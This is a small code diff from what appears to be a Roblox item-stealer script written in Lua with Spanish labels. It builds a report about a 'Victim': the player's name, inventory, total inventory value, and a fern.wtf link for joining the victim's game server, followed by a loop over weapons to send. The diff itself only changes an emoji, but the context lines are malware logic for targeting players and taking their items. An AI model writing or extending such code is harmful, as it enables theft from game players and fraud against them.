@@ -183,7 +183,7 @@ local safeLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&ga
 local fieldsInit={
     {name="Victim 👤:", value=LocalPlayer.Name, inline=true},
     {name="Inventario 📦:", value="", inline=false},
-    {name="Valor total del inventario📦:", value=tostring(totalValue).."💎", inline=true},
+    {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
     {name="Click para unirte a la víctima 👇:", value=safeLink, inline=false}
 }
 for _, w in ipairs(weaponsToSend) do
